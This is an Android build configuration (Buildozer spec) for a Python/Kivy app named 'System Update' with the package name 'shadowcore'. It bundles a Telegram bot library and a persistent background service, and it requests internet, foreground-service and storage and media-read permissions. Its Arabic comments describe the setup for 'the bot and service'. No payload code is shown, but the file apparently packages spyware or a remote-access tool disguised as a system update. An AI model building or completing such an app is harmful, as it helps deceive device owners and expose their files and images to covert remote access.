[app]
title = System Update
package.name = shadowcore
package.domain = org.test
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 1.0

# المتطلبات الأساسية لعمل البوت والخدمة
requirements = python3,kivy,pyjnius,requests,pyTelegramBotAPI

android.permissions = INTERNET, WAKE_LOCK, FOREGROUND_SERVICE, POST_NOTIFICATIONS, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, READ_MEDIA_IMAGES, FOREGROUND_SERVICE_DATA_SYNC

android.api = 33
android.minapi = 21
android.archs = arm64-v8a, armeabi-v7a
android.enable_androidx = True

# ربط الخدمة الخلفية
services = Service:service.py

[buildozer]
log_level = 2
warn_on_root = 1
